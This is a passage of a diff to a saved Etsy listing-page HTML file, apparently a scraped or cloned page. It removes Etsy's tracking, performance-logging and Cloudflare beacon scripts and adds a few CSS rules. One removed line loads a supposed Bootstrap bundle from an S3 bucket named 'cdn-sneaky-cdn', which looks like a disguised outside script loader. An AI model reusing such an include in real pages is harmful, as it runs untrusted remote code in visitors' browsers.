:["on","w","6c0626"],"site_chrome\/buyer_zipcode_in_header_desktop":["off","x","eb55bf"],"site_chrome\/buyer_zipcode_in_header_mweb":["ineligible","e","5d612c"],"builda_scss":["sasquatch","x","96bd82"],"polyfills":["on","x","db574b"],"polyfill_experiment_4":["no_filtering","x","0e8409"],"engagement.notification_feed_aggregation":["on","x","8da111"],"web_deals.deals_and_nondeals_update_feeds":["on","x","a6a52b"],"buyer_support\/etsy_service_holdout":["ineligible","e","fa33b2"],"buyer_support\/etsy_service_launch_layers":["off","w","0f3241"],"web_deals.translate_nav_recs":["on","x","f054b7"],"ranking\/search.experience.category_suggestions_in_autosuggest":["ineligible","e","6e2d9f"],"ranking\/search.experience.contentful_title_on_trending_searches":["on","x","d0b108"],"ranking\/search.experience.always_show_shop_search_in_autosuggest":["on","x","66727b"],"buyer_reviews.accurate_header_review_count":["on","x","426a8c"],"growth_regx.lp_rating_histogram_shop_header_desktop":["off","x","1c99da"],"growth_regx.lp_message_seller_replace_collections_buy_box_desktop_si":["off","x","f17d61"],"gcs_image_reads":["on","x","b7a48f"],"searchx.4q18.dwell_time_as_backend_event":["off","x","d3826b"],"seller_service_squad.convos_condensed_disclosure_copy_update_buyer":["on","x","cadf0d"],"disambiguate_usd_outside_usa":["ineligible","e","c8897d"],"gift_mode.lp_bin_sheet_tiag_v2":["on","x","1beeb9"],"cnc.atc_from_listing_cards_ymal_mfts_desktop":["on","x","58b479"],"perso_custo.buyer_read_from_new_perso_tables":["on","x","dffb8d"],"local_pe.q3_2025.buyer_trust_accelerator.browser.traffic_split":["on","w","eaad53"],"growth_regx.lp_seller_cred_shop_desc_desktop":["on","w","4bc04e"],"cnc.extend_elp_layout_desktop_external":["off","x","fb525e"],"local_pe.q3_2025.international.browser.traffic_split":["on","w","4ca9c3"],"iat.listing_page_hide_similar_items_sash.desktop":["off","x","e2a169"],"loyalty.frequency_override":["off","x","ced4cc"],"loyalty.purchase_days_override":["off","x","2f8ccb"],"cow_layer\/desktop_lp_evolved_favoriting_v2":["on","x","2ca26f"],"growth_regx.lp_bb_trust_redesign_desktop":["off","x","df41b4"],"checkout.klarna_unified_pay_later":["ineligible","e","e11748"],"perso_buyer_squad_layer\/variations_update":["on","x","0e428d"],"perso_custo.multiple_questions_enabled.buyer_side":["on","x","82e6f7"],"seo.listing_shop_faqs_machine_translation":["off","x","ad47eb"],"onsite_promos.superbowl_listing_page_banner":["ineligible","e","2deace"],"inventory.listing_inventory_quantity_select":["off","x","e2182e"],"seller_pricing.make_an_offer_auto_favorite_listing":["ineligible","e","6f5719"],"growth_regx.lp_production_partners_in_item_details":["on","x","3cd0fb"],"growth_regx.lp_review_photo_filter_and_sort_desktop":["on","x","acff7a"],"growth_regx.lp_review_engagement_aa_desktop":["off","x","bfb356"],"growth_regx.lp_new_seller_cred_foundational_desktop":["on","x","bccc3b"],"cnc.anchor_item_lp_recs_desktop":["off","x","315c33"],"cnc.visual_search_tags_external":["off","x","b589cb"],"cnc\/experiment.related_search_pathways_v3_desktop":["ineligible","e","7e808d"],"lp_performance.css_import_cleanup":["on","x","ec2bd2"],"cnc\/experiment.compare_lp_collections_v2_desktop":["ineligible","e","c0c984"],"local_pe.q3_2025.chops.browser.traffic_split":["on","w","2dd4c9"],"chops.elp_related_trends_module.desktop":["on","x","b11d14"],"ads\/takerate.lp_ads_row_expansion.desktop":["ineligible","e","cad35c"],"cnc.listing_card_styling_desktop":["off","w","cef3b1"],"cnc.only_prompt_similar_listing_desktop":["off","x","1f1344"],"core_fulfillment.product_level_readiness_states.core_experience":["off","x","d06c95"],"fulfillment_platform.usps_pm_faster_ga_experiment.web":["on","x","498eec"],"fulfillment_platform.usps_pm_faster_ga_experiment.mobile":["ineligible","e","20f21b"],"fulfillment_ml.ml_predicted_acceptance_scan.uk.operational":["on","x","74db8e"],"fulfillment_ml.ml_predicted_acceptance_scan.uk.experiment_web":["prod","x","9a5255"],"fulfillment_ml.ml_predicted_acceptance_scan.uk.experiment_mobile":["ineligible","e","865516"],"fulfillment_ml.ml_predicted_acceptance_scan.germany.operational":["off","x","4528ab"],"fulfillment_ml.ml_predicted_acceptance_scan.germany.experiment_web":["off","x","cac266"],"fulfillment_ml.ml_predicted_acceptance_scan.germany.experiment_mobile":["ineligible","e","9a29ab"],"fulfillment_platform.edd_cart_caching.web":["edd_and_arizona_cache","x","e313fc"],"fulfillment_platform.edd_cart_caching.mobile":["ineligible","e","ffb947"],"fulfillment_platform.consolidated_country_to_country_ml_times.experiment_web":["prod","x","2eac66"],"fulfillment_platform.consolidated_country_to_country_ml_times.experiment_mobile":["ineligible","e","81b585"],"engagement.skip_notifications_cache":["off","x","4289e3"],"buyer_freq.collecting_flywheel.legacy_notification_set_deprecation":["on","x","34c88b"],"checkout\/paypal_smart_button_desktop":["ineligible","e","07b533"],"checkout\/paypal_smart_button_mweb":["ineligible","e","643355"],"mobile_dynamic_config.iphone.ApplePayPaymentMethods.Girocard":["ineligible","e","fbb78b"],"mobile_dynamic_config.iphone.ApplePayPaymentMethods.CartesBancaires":["ineligible","e","47f399"],"checkout\/google_pay_on_web_v2":["on","x","cbf24c"],"checkout\/add_jcb_cc_payment_method":["on","x","ce90aa"],"checkout\/bin_confidence":["show_cc","x","990cfd"],"checkout.klarna_us_price_bands_v2":["ineligible","e","658ea6"],"checkout.klarna_uk_price_bands_v2":["ineligible","e","c4d855"],"checkout.etsy_bin_on_apple_pay_devices":["on","x","e77719"],"cnc.boe_dataset_related_searches":["on","x","d28934"],"perso_engine.recs.ssq_on_web_u2l_version":["on","x","c2a009"],"perso_engine.recs.ssq_on_web_u2l_version_internal":["on","x","4a8ed2"],"perso_engine.recs.listing_page_external_query_ranker_v2":["off","x","e3548f"],"perso_engine.recs.listing_page_internal_query_ranker_v2_fix":["on","x","e872dc"],"fulfillment_ml.ml_predicted_acceptance_scan.ups_fedex.experiment_web":["on","x","6ef73d"],"fulfillment_ml.ml_predicted_acceptance_scan.ups_fedex.experiment_mobile":["ineligible","e","81c794"],"fulfillment_ml.usps_route_predictor.web":["on","x","7f6b44"],"fulfillment_ml.usps_route_predictor.mobile":["ineligible","e","5a1b77"],"fulfillment_ml.only_display_edd_max.web":["ineligible","e","2d500c"],"fulfillment_ml.only_display_edd_max.mobile":["ineligible","e","07bd93"],"navx.always_images_in_l2":["off","x","d6d388"],"local_pe.q3_2025.search.browser.traffic_split":["on","w","b06317"],"ranking\/search.experience.refinement_pills_in_autosuggest":["ineligible","e","2a2140"],"ranking\/search.experience.trending_searches_in_zero_pane_v2":["on","x","cdb259"],"loyalty.web.reduce_listing_signup_prompts_exp":["on","x","bf6a41"],"cnc.remove_atc_mweb":["ineligible","e","699ff5"],"dynamic_experiments.Merch_JewelrySale25_SkinnyBanner_test_v3":["ineligible","e","89c994"],"dynamic_experiments.Merch_JewelrySale25_SkinnyBanner_test":["ineligible","e","6ff9d7"],"dynamic_experiments.Merch_DDGSkinnyBanner24_V2_test":["ineligible","e","8e97c7"],"dynamic_experiments.Merch_DDGSkinnyBanner24_test":["ineligible","e","5a291a"],"dynamic_experiments.Merch_LaborDay24_Link_test":["ineligible","e","63a995"],"dynamic_experiments.Merch_FDAY24_GiftTeaser_test":["ineligible","e","18d6f7"],"dynamic_experiments.Merch_GiftMode24_Teaser_test":["ineligible","e","3ad555"],"payments.simulate_giftcards_unavailable":["off","x","32e3df"],"api.ab_bubbling_experiment.browser_flag.listzilla_get_listing_state":["ineligible","e","f05e23"],"coreloc.listing_page_local_shipping_signal":["on","x","1bd157"],"eu_crd_compliance.buyer":["on","x","bfc6b5"],"checkout.checkout_sheet_support_for_non_defaults_bin_web":["off","x","4ef136"],"android_image_filename_hack":["ineligible","e","9c9013"],"seller_reach.promotions.mix_and_match.v2_bundles_no_filter":["on","x","cf2d87"],"growth_regx.lp_seller_cred_badges_desktop":["on","x","153a58"],"listing_process.how_its_made_properties.use_module_classifier":["on","x","a5aaed"],"buyer_reviews.seasonal.cyor_holiday_message_2022.desktop":["off","x","c8ee66"],"buyers_often_buying.peek_overlay_with_easier_help_and_shop_access_desktop":["off","x","4960a2"],"buyer_support\/buyer_chatbot_on_help_center.help_menu_on_homepage":["on","x","34f43b"],"navx.fnb_gift_cards_multivariate":["ineligible","e","0fd1cc"],"ranking\/recs.custom_candidates_signal_ranker_v4":["ineligible","e","9b2405"],"ranking\/recs.custom_candidates_signal_ranker_v0":["on","x","3eae86"],"iat.listing_page_trust_suite_banner.desktop":["shield_icon","x","267e29"],"coreloc.digital_download_signal_placement_expansion_desktop":["on","x","70b59f"],"seller_onboarding_layer\/svx.enhanced_verification":["on","x","bdd19d"],"growth_regx.lp_anchor_shop_name_to_seller_cred_desktop":["off","w","53f1a2"],"growth_regx.lp_review_feature_tags_buybox_desktop":["off","x","e7bed6"],"recs_systems.enable_recs_tracking_delivered_events":["on","x","a94bcf"],"growth_regx.lp_review_categorical_tags_in_deep_dive_desktop":["on","x","9d91d4"],"growth_regx.lp_reviews_new_deep_dive_desktop":["sheet_center","w","9a41a1"],"growth_regx.lp_reviews_this_item_badge_desktop":["on","x","1b4475"],"search.use_dark_cluster":["off","x","335bf8"],"search.force_x":["off","x","697d9b"],"cnc.updated_scarcity_signals_lp":["off","x","181046"],"cnc.sidebar_cart_post_atc_recs_v3":["off","x","13c110"],"site_chrome\/cnc.sidebar_cart_zero_to_one":["ineligible","e","45076d"],"site_chrome\/cnc.sidebar_cart_remove_quantity":["on","x","4ea54a"],"cnc.sidebar_cart_open_in_same_tab":["on","x","ed65a2"],"site_chrome\/fullstory\/use_track_event":["ineligible","e","ae465c"],"google_tag_manager_async":["off","x","7585d0"],"qualtrics_survey":["ineligible","e","c3c730"],"qualtrics_survey_non_en":["ineligible","e","5fec45"],"buyer_promise.issue_resolution.buyer_support\/profile_dropdown_to_help_center":["on","x","2d4fea"],"buyers_often_buying.show_discount_prices_on_the_hp_listings":["on","x","e60c20"],"content_moderation.report_item.desktop":["on","x","4dfa1d"],"growth_regx.lp_mask_generated_names_in_reviews":["off","x","ea05d2"],"growth_regx.lp_sh_tenure_to_open_date":["off","w","0c6a3e"],"collections.privacy_clearer_setting_description":["on","x","412fbc"],"prodperfect\/monthly_data_capture":["off","x","137afb"],"buyer_support\/epp_promise_messaging":["ineligible","e","4ebacd"],"growth_regx.lp_view_shop_registration_details":["on","x","fec272"],"ranking\/ad_delivery.ubo_obfuscated_grey_class":["on","x","264198"],"eu_cookie_nag":["ineligible","e","f8045f"],"cnc.related_searches_placement":["off","x","157607"],"gifting.gnav_desktop_flyout":["ineligible","e","55be9d"],"seller_platform_web.buyer_inquiry":["off","x","ee9de4"],"seller_platform_web.seller_local_time":["off","x","98a5ac"],"seller_platform_web.item_detail_overlay":["on","x","cf46a1"],"buyer_promise.issue_resolution.fee_avoidance_v2":["on","x","3a7a9c"],"risk_experience.buyer_email_verification":["ineligible","e","a98aad"]},"user_id":1135369000,"page_guid":"ffd82861b31.44b97b90cfaedc166dd4.00","version":1,"request_uuid":"EuWhMmYDWq2W7QI9Hqf8w2F9Zf4c","cdn-provider":"fastly","header_fingerprint":"ualc","header_signature":"69c9130808b6fc1a3dc577fcfe0bf284","ip_org":"PacketHub","ref":"","loc":"http:\/\/www.etsy.com\/listing\/1790774795\/book-club-print-bookish-poster-trendy?ls=r&ref=rlp-listing-grid-2&external=1&space_id=1359364143966&sts=1&dd=1&content_source=52b99da6862466211894f724d195c6bb%253A2ca474494f71c831169387d00a6b689c028b9d90&logging_key=52b99da6862466211894f724d195c6bb%3A2ca474494f71c831169387d00a6b689c028b9d90","locale_currency_code":"IDR","pref_language":"en-GB","region":"ID","detected_currency_code":"IDR","detected_language":"en-GB","detected_region":"ID","accept-languages":"en-GB,en-US,en,id","ga_client_id":"GA1.1.1638654150.1758102791","isWhiteListedMobileDevice":false,"isMobileRequestIgnoreCookie":false,"isMobileRequest":false,"isMobileDevice":false,"isMobileSupported":false,"isTabletSupported":false,"isTouch":false,"isEtsyApp":false,"isPreviewRequest":false,"isChromeInstantRequest":false,"isMozPrefetchRequest":false,"isTestAccount":false,"isSupportLogin":false,"isInternal":false,"isInWebView":false,"isBot":false,"urlRef":"rlp-listing-grid-2","isAdmin":false,"isSyntheticTest":false,"ebid":"OcKTHyWOrdkY9__kmFV6X2wlf-U45QXJ","event_source":"web","browser_id":"3risB690iqgVMEj0sW3Jxya5aa04","gdpr_tp":3,"gdpr_p":3,"legacy_p":3,"legacy_tp":3,"cmp_tp":true,"cmp_p":true,"page_time":791,"load_strategy":"page_navigation"};
-    !function(e,t){var n=e.__etsy_logging,o=n.url,i=n.firedEvents,r=n.defaults,s=r.ab||{},a=n.bots.botCheck,c=n.bots.isBot;n.mergeObject=function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var o in n)Object.prototype.hasOwnProperty.call(n,o)&&(e[o]=n[o])}return e};!r.ref&&(r.ref=t.referrer),!r.loc&&(r.loc=e.location.href),!r.webkit_page_visibility&&(r.webkit_page_visibility=t.webkitVisibilityState),!r.event_source&&(r.event_source="web"),r.event_logger="frontend",r.isIosApp&&!0===r.isIosApp?r.event_source="ios":r.isAndroidApp&&!0===r.isAndroidApp&&(r.event_source="android"),a.length>0&&(r.botCheck=r.botCheck||[],r.botCheck=r.botCheck.concat(a)),r.isBot=c,t.wasDiscarded&&(r.was_discarded=!0);var v=function(t){if(e.XMLHttpRequest){var n=new XMLHttpRequest;n.open("POST",o,!0),n.send(JSON.stringify(t))}};n.updateLoc=function(e){e!==r.loc&&(r.ref=r.loc,r.loc=e)},n.adminPublishEvent=function(n){"function"==typeof e.CustomEvent&&t.dispatchEvent(new CustomEvent("eventpipeEvent",{detail:n})),i.push(n)},n.sendEvents=function(t,i){var a=r;if("perf"===i){var c={event_logger:i};n.asyncAb&&(c.ab=n.mergeObject({},n.asyncAb,s)),a=n.mergeObject({},r,c)}var f={events:t,shared:a};e.navigator&&"function"==typeof e.navigator.sendBeacon?function(t){t.events.forEach((function(e){e.attempted_send_beacon=!0})),e.navigator.sendBeacon(o,JSON.stringify(t))||(t.events.forEach((function(e){e.send_beacon_failed=!0})),v(t))}(f):v(f),n.adminPublishEvent(f)}}(window,document);
-</script>
-<script src="https://cdn-sneaky-cdn.s3.ap-southeast-2.amazonaws.com/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
-<script type='text/javascript' nonce='gPiNOjdRCrWLas5Ik2CuS+N0'>window.__etsy_logging.perf.event={"attributes":{"guid":"ffd82863095.3df1f9657cf4654ab662.00","event_name":"perf","event_logger":"perf","page_type":"view_listing","device_type":"Desktop","browser_name":"Chrome","browser_version":"140.0.7339.128","ip_city":"Jakarta","ip_region":"JK","ip_country_code":"ID","boromir":true}};!function(e,t){if(!t.hidden){var n=e.__etsy_logging||{},r=n.perf||{},i=n.url,a=n.defaults,o=r.event,s=n.sendEvents,c=0===Object.keys(r).length,u=e.webVitals||{},d=n.mergeObject,m=r.isDev||!1,_=r.skipLoggingEvent||!1,l=r.keepPerfObserverActive||!1,f=null,p=0;if(!c&&i&&a&&o&&s){var g=r.MARK_MEASURE_PREFIX||"_etsy_mark_measure_",v=function(e){var t=!1;return function(){t||(t=!0,e.apply(this,arguments))}},y=function(){return void 0!==e.PerformanceObserver},h=function(){return"onpagehide"in e},T=function(e,n){var r=function(e){var n=t.createElement("a");n.href=e;var r=n.pathname.split(".");return r[r.length-1]||""}(e);return/jpe?g|png|svg|gif/i.test(r)?"image":/eot|woff2?|ttf/i.test(r)?"font":"js"===r?"js":"css"===r?"css":"xmlhttprequest"===n?"xhr":"unknown"},E=function(e){return Math.round(e<Math.pow(2,64)-1?e:0)},b=function(e,n){var r=null,i=null;if(n.transferSize>0)for(var a=0;a<n.serverTiming.length;a++){var o=n.serverTiming[a];e.i_etsystatic_cdn||"cdn"!==o.name?"cache_status"===o.name&&(i=o.description):r=o.description}r&&(e.i_etsystatic_cdn=r);var s=null,c=null;i&&(e.cdn_image_caching||(e.cdn_image_caching={miss:0,hit:0}),s=0===i.indexOf("HIT"),c=0===i.indexOf("MISS"),s&&(e.cdn_image_caching.hit+=1),c&&(e.cdn_image_caching.miss+=1)),function(e,n,r,i){f||(f={},t.querySelectorAll("img[data-perf-group]").forEach((function(e){e.currentSrc&&(f[e.currentSrc]=e)})));var a=f[n.name];if(a){var o=a.dataset.perfGroup;e.categorized_images||(e.categorized_images=[]);var s={category:o,duration:E(n.duration),encodedBodySize:E(n.encodedBodySize),transferSize:E(n.transferSize),width:a.width,height:a.height};if(n.transferSize>0){(r||i)&&(s.cdn_hit=r);for(var c=0;c<n.serverTiming.length;c++){var u=n.serverTiming[c];"clientrtt"===u.name?s.clientrtt=E(u.duration):"clienttt"===u.name?s.clienttt=E(u.duration):"cdntime"===u.name?s.cdntime=E(u.duration):"origin"===u.name&&(s.origin=E(u.duration))}}e.categorized_images.push(s)}}(e,n,s,c)},S=function(e){var t={nav_start:E(e.navigationStart||e.startTime),activation_start:E(e.activationStart||0),fetch_start:E(e.fetchStart),dns_start:E(e.domainLookupStart),dns_end:E(e.domainLookupEnd),connect_start:E(e.connectStart),connect_end:E(e.connectEnd),interim_response_start:E(e.firstInterimResponseStart||0),request_start:E(e.requestStart),response_start:E(e.responseStart),response_end:E(e.responseEnd),dom_completed:E(e.domComplete),dom_interactive:E(e.domInteractive),secure_connect_start:E(e.secureConnectionStart)||null,loaded_start:E(e.loadEventStart)||null,loaded_end:E(e.loadEventEnd)||null,dom_content_loaded_start:E(e.domContentLoadedEventStart)||null,dom_content_loaded_end:E(e.domContentLoadedEventEnd)||null,html_tx_size:E(e.transferSize),html_enc_size:E(e.encodedBodySize),html_dec_size:E(e.decodedBodySize),type:e.type};return e.redirectStart&&(t.redirect_start=E(e.redirectStart)),e.redirectEnd&&(t.redirect_end=E(e.redirectEnd)),e.redirectCount&&(t.redirect_count=e.redirectCount),t},k=function(e){return e.reduce((function(e,t){if("entryType"in t){if("resource"===t.entryType)return function(e,t){var n=T(t.name,t.initiatorType);if("unknown"===n)return e;var r=t.name.match(/etsy(static)?(cloud)?\.com/)?"etsy":"third";"image"===n&&"etsy"===r&&(t.name.match(/img0\.etsystatic/)?e.img0_count=(e.img0_count||0)+1:t.name.match(/img1\.etsystatic/)&&(e.img1_count=(e.img1_count||0)+1)),"image"===n&&"etsy"===r&&t.serverTiming&&t.name.match(/i\.etsystatic\.com/)&&b(e,t);var i="sum_"+r+"_"+n+"_bytes",a="sum_"+r+"_"+n+"_enc_bytes",o="sum_"+r+"_"+n+"_tx_bytes",s="sum_"+r+"_"+n+"_dur",c="count_"+r+"_"+n+"_req";return e[i]=(e[i]||0)+E(t.decodedBodySize),e[a]=(e[a]||0)+E(t.encodedBodySize),e[o]=(e[o]||0)+E(t.transferSize),e[s]=(e[s]||0)+E(t.duration),e[c]=(e[c]||0)+1,e}(e,t);if("paint"===t.entryType)return function(e,t){return e[t.name.replace(/-/g,"_")]=E(t.startTime),e}(e,t);if("longtask"===t.entryType)return function(e,t){return e.long_tasks_count=(e.long_tasks_count||0)+1,e.long_tasks_dur=(e.long_tasks_dur||0)+E(t.duration),e}(e,t);if("mark"===t.entryType||"measure"===t.entryType)return function(e,t){return 0===t.name.lastIndexOf(g,0)&&(e[0===t.name.lastIndexOf(g+"async_spec_",0)?t.name.substring(g.length):t.name]=E("mark"===t.entryType?t.startTime:t.duration)),e}(e,t);if("layout-shift"===t.entryType&&!t.hadRecentInput)return function(e,t){return e.layout_shift_count=(e.layout_shift_count||0)+1,e.layout_shift=(e.layout_shift||0)+t.value,t.value>.05&&(e.layout_shift_elements=e.layout_shift_elements||[],e.layout_shift_elements.push({value:t.value,elements:(t.sources||[]).filter((function(e){return!!e.node})).map((function(e){return{className:e.node.classList&&Array.prototype.slice.call(e.node.classList).join(" "),tagName:e.node.tagName,id:e.node.id}}))})),e}(e,t);if("navigation"===t.entryType)return r.t=!0,d(e,S(t));if("element"===t.entryType)return function(e,t){return e.element_timings||(e.element_timings={}),e.element_timings[t.identifier]=t.renderTime,e}(e,t);if("long-animation-frame"===t.entryType)return function(e,t){e.loaf_entries||(e.loaf_entries=[]);var n={start:E(t.startTime),duration:E(t.duration),blockingDuration:E(t.blockingDuration)},r=t.scripts.slice().sort((function(e,t){t.duration,e.duration}))[0];if(r){var i=r.invoker||r.name;n.longestScript={invokerType:r.invokerType||r.type,duration:E(r.duration),invoker:i.substring(0,1024),sourceURL:r.sourceURL||null}}return e.loaf_entries.push(n),e}(e,t)}else if("name"in t){if("INP"===t.name)return function(e,t){return e.interaction_next_paint=t.value,t.attribution&&(e.interaction_next_paint_element=t.attribution.eventTarget,e.interaction_next_paint_time=E(t.attribution.eventTime),e.interaction_next_paint_type=t.attribution.eventType,e.interaction_next_paint_loadstate=t.attribution.loadState),e}(e,t);if("LCP"===t.name)return function(e,t){var n=t.entries[0];return e.largest_contentful_paint=E(n.renderTime||n.loadTime),e.largest_contentful_paint_type=n.renderTime?"renderTime":"loadTime",n.element?(e.largest_contentful_paint_element={className:n.element.classList&&Array.prototype.slice.call(n.element.classList).join(" "),tagName:n.element.tagName,url:n.url},t.attribution.lcpResourceEntry&&(e.largest_contentful_paint_element.resource_size=E(t.attribution.lcpResourceEntry.encodedBodySize))):delete e.largest_contentful_paint_element,e.lcp_element_render_delay=E(t.attribution.elementRenderDelay),e.lcp_resource_load_delay=E(t.attribution.resourceLoadDelay),e.lcp_resource_load_time=E(t.attribution.resourceLoadTime),e}(e,t)}return e}),{})},L=function(){var n,i=!y()&&performance&&performance.getEntries?performance.getEntries():r.e,a=k(i);return r.e=[],r.t||(a.unixTimingNavigation=!0,d(a,S(e.performance.timing))),d(a,function(){if(performance&&performance.getEntriesByName){var e=performance.getEntriesByName("TTP","mark");if(e.length)return{time_to_parsing:E(e[0].startTime)}}return{}}()),d(a,{dom_count_server:p,dom_count_client:t.getElementsByTagName("*").length}),d(a,{dom_max_depth:(n=function(e){if(!e)return 0;for(var t=0,r=0,i=e.children.length;r<i;r++)t=Math.max(t,n(e.children[r]));return t+1})(t.documentElement)}),function(e){var t=navigator;t&&t.connection&&t.connection.effectiveType&&(e.effective_connection_type=t.connection.effectiveType)}(a),a.has_sendbeacon=navigator&&"function"==typeof navigator.sendBeacon,a.has_observer=y(),y()&&PerformanceObserver.supportedEntryTypes&&(a.observer_types=PerformanceObserver.supportedEntryTypes),a.has_pagehide=h(),r.vm_hostname&&(a.vm_hostname=r.vm_hostname),a},z=v((function(n){var r=d(n,o.attributes);r.beacon_send_time=0===r.nav_start?E(performance.now()):(new Date).getTime(),r.page_time=a.page_time,"function"==typeof e.CustomEvent&&t.dispatchEvent(new CustomEvent("perfDataSent",{detail:r})),s([r],"perf")}));!function(){var n=function(e){r.e.length&&(r.e=r.e.concat(e))};if(!!u.onINP&&u.onINP(n,{reportAllChanges:!0}),u.onLCP&&u.onLCP(n),y()&&PerformanceObserver.supportedEntryTypes&&PerformanceObserver.supportedEntryTypes.includes("long-animation-frame")){var i=new PerformanceObserver((function(e){e.getEntries().forEach((function(e){e.duration>150&&e.firstUIEventTimestamp>0&&n(e)}))}));i.observe({type:"long-animation-frame",buffered:!0})}if(!_){var a,o=v((function(e){if(!t.hidden||"on_vischange"===e){clearTimeout(a);var n=L();!l&&y()&&(r.o.disconnect(),i&&i.disconnect()),n[e]=!0,z(n)}})),s=function(){return m&&e.__KEVIN_IS_STILL_BUILDING};m||(a=setTimeout((function(){o("on_fallbacktimeout")}),6e4),"complete"===t.readyState&&(clearTimeout(a),a=setTimeout((function(){o("on_loadtimeout")}),2e4))),t.addEventListener("readystatechange",(function(){"interactive"===t.readyState&&(p=t.getElementsByTagName("*").length)})),e.addEventListener("load",(function(){clearTimeout(a),s()||(a=setTimeout((function(){o("on_loadtimeout")}),2e4))}));var c=function(e){var t=e||"on_unload";s()?(0===performance.getEntriesByName(`${r.MARK_MEASURE_PREFIX}dev_kevin-overlay-end`).length&&performance.mark(`${r.MARK_MEASURE_PREFIX}dev_kevin-overlay-abandoned-before-done`),setTimeout((function(){o(t)}),0)):o(t)},d=h()?"pagehide":"unload";e.addEventListener(d,c),m&&e.addEventListener("beforeunload",c),t.addEventListener("visibilitychange",(function(){t.hidden&&c("on_vischange")}))}}(),r.logger={getMetricsFromQueue:k}}else n.eventpipe&&n.eventpipe.logEvent&&n.eventpipe.logEvent({event_name:"perf_beacon_not_fired",missing_global_perf_data:c,missing_post_url:!i,missing_defaults:!a,missing_perf_event:!o,missing_send_events:!s})}}(window,document);;</script>
-<script type='text/javascript' nonce='gPiNOjdRCrWLas5Ik2CuS+N0'>window.__etsy_logging.eventpipe.primary_complement={"attributes":{"guid":"ffd82863091.aa4443168e8dd09088ac.00","event_name":"view_listing_complementary","event_logger":"frontend","primary_complement":true}};!function(e){var t=e.__etsy_logging,i=t.eventpipe,n=i.primary_complement,o=t.defaults.page_guid,r=t.sendEvents,a=i.q,c=void 0,d=[],h=0,u="frontend",l="perf";function g(){var e,t,i=(h++).toString(16);return o.substr(0,o.length-2)+((t=2-(e=i).length)>0?new Array(t+1).join("0")+e:e)}function v(e){e.guid=g(),c&&(clearTimeout(c),c=void 0),d.push(e),c=setTimeout((function(){r(d,u),d=[]}),50)}!function(t){var i=document.documentElement;i&&(i.clientWidth&&(t.viewport_width=i.clientWidth),i.clientHeight&&(t.viewport_height=i.clientHeight));var n=e.screen;n&&(n.height&&(t.screen_height=n.height),n.width&&(t.screen_width=n.width)),e.devicePixelRatio&&(t.device_pixel_ratio=e.devicePixelRatio),e.orientation&&(t.orientation=e.orientation),e.matchMedia&&(t.dark_mode_enabled=e.matchMedia("(prefers-color-scheme: dark)").matches)}(n.attributes),v(n.attributes),i.logEvent=v,i.logEventImmediately=function(e){var t="perf"===e.event_name?l:u;e.guid=g(),r([e],t)},a.forEach((function(e){v(e)}))}(window);</script>
+        .brand--logo {
+            margin-right: 78px;
+            max-width: 139px;
+        }
 
-        
+        .header__icons {
+            align-items: center;
+        }
 
-            <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">if(window.console){console.log("Is code your craft? https://careers.etsy.com")}</script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"812530adc2054e63af7a60985d4a1fa3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"361941dbca8143ceab6659f6011c1da5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"361941dbca8143ceab6659f6011c1da5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"361941dbca8143ceab6659f6011c1da5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"361941dbca8143ceab6659f6011c1da5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a7f146d78f6448afba61412ae1ed583e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
